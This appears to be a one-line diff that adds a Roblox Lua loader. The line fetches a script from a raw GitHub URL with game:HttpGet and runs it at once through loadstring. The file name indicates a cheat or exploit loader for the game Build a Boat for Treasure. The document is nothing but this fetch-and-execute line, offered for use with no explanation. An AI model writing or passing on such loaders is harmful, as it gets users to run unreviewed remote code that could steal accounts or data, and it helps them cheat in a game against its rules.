@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/build-a-boat-for-treasure-s2-spik5w7mdk8v8g.lua"))()
